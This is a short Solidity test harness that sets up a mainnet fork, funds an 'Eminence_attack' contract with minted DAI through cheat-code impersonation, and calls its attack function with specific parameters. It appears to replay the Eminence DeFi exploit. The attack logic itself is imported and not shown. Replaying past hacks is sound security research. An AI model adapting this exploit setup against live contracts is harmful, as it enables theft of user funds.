// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;

import "ds-test/test.sol";
import "../attack.sol";
import "../stdlib.sol";
import "../Vm.sol";
import "../CheatCodes.sol";


contract attackTester is DSTest, stdCheats {
    Eminence_attack attackContract;
    Vm public constant vm = Vm(HEVM_ADDRESS);
    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);

    constructor() {
        startHoax(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58), 90000000000 ether);
        attackContract = new Eminence_attack();
        cheats.stopPrank();
        IDAI DAI = IDAI(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        startHoax(address(0x9759A6Ac90977b93B58547b4A71c78317f391A28));
        DAI.mint(address(attackContract), 15000000 * 10 ** 18 );
        cheats.stopPrank();    
    }
    function testExample0_() public {
      attackContract.attack0(15000000,691825807,691825807,572431,691825227);
    }

}